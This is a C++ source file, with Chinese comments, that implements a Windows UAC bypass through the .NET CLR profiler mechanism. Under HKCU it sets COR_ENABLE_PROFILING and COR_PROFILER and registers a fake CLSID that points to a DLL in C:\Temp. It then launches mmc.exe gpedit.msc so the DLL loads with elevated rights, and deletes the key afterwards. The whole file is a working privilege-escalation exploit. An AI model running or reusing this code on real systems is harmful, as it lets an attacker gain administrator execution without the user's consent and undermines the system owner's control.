// CLR提权.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <windows.h>

int main(int argc,char* argv[])
{
	HKEY hKeyExe = NULL;
	HKEY hEnv = NULL;
	HKEY hCLSID = NULL;
	// 1、 注册提权exe地址,dll文件读取该地址执行
	if (argc < 2)
	{
		printf("请指定提权exe文件路径！\n");
		return 0;
	}
	// 1.1 将需要提权的文件路径注册到HKCU\Software\MyExe下
	int nLen = strlen(argv[1]);
	TCHAR szExePath[MAX_PATH] = {};
	MultiByteToWideChar(CP_ACP, NULL, argv[1], nLen, szExePath, MAX_PATH);
	TCHAR szKeyName[MAX_PATH]={ L"Software\\MyExe" };
	long lResult = RegCreateKeyEx(HKEY_CURRENT_USER,
		szKeyName, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS| KEY_WOW64_32KEY, NULL, &hKeyExe, NULL);
	if (lResult != ERROR_SUCCESS)
		return 0;
	RegSetValueEx(hKeyExe, NULL, 0, REG_SZ, (BYTE*)szExePath,nLen*2);
	RegCloseKey(hKeyExe);
	// 2、 添加环境变量
	lResult = RegCreateKeyEx(HKEY_CURRENT_USER,
		L"Environment", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_32KEY, NULL, &hEnv, NULL);
	if (lResult != ERROR_SUCCESS)
		return 0;
	RegSetValueEx(hEnv, L"COR_ENABLE_PROFILING", 0, REG_SZ, (BYTE*)L"1", 2);
	TCHAR wcCLSID[] = L"{11111111-1111-1111-1111-111111111111}";
	RegSetValueEx(hEnv, L"COR_PROFILER", 0, REG_SZ, (BYTE*)wcCLSID, wcslen(wcCLSID)*2);
	RegCloseKey(hEnv);
	// 3、 注册CLSID,指定dll路径
	TCHAR szCLSID[MAX_PATH] = {L"Software\\Classes\\CLSID\\{11111111-1111-1111-1111-111111111111}\\InprocServer32"};
	// 演示用，DLL路径固定
	TCHAR szDll[MAX_PATH] = {L"C:\\Temp\\test.dll"};
	RegCreateKeyEx(HKEY_CURRENT_USER,
		szCLSID, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_32KEY, NULL, &hCLSID, NULL);
	RegSetValueEx(hCLSID, NULL, 0, REG_SZ, (BYTE*)szDll, (wcslen(szDll)+1)*2);
	RegCloseKey(hCLSID);
	// 4、启动msc程序，加载DLL
	system("mmc.exe gpedit.msc");
	// 5、删除注册的CLSID键，防止影响正常程序运行
	RegDeleteKeyEx(HKEY_CURRENT_USER, szCLSID, KEY_WOW64_32KEY, NULL);
    return 0;
}

